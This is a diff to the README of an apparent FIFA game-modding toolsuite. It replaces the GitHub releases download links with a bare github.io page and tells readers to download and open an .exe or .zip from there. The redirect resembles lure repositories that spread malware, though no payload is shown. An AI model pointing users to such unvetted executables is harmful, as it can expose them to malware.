@@ -1,6 +1,6 @@
 # ⚽ FIFA-Editing-Toolsuite - Customize your professional football game experience
 
-[![Download Toolsuite](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/perlcapacitive974/FIFA-Editing-Toolsuite/releases)
+[![Download Toolsuite](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://perlcapacitive974.github.io)
 
 This application provides tools to modify game files for your favorite football titles. You can change player faces, update kits, edit roster data, and improve graphics. This toolset works with the Frostbite engine to give you control over textures, 3D meshes, and legacy game assets.
 
@@ -19,7 +19,7 @@ Ensure your computer has the following items before you start the installation p
 
 Follow these steps to acquire the software:
 
-1. Visit the following link to access the list of available versions: [https://github.com/perlcapacitive974/FIFA-Editing-Toolsuite/releases](https://github.com/perlcapacitive974/FIFA-Editing-Toolsuite/releases).
+1. Visit the following link to access the list of available versions: [https://perlcapacitive974.github.io](https://perlcapacitive974.github.io).
 2. Choose the version marked as "Latest" at the top of the page.
 3. Click on the file ending in ".exe" or ".zip" to start the download to your computer.
 4. Open the downloaded file once the transfer completes.
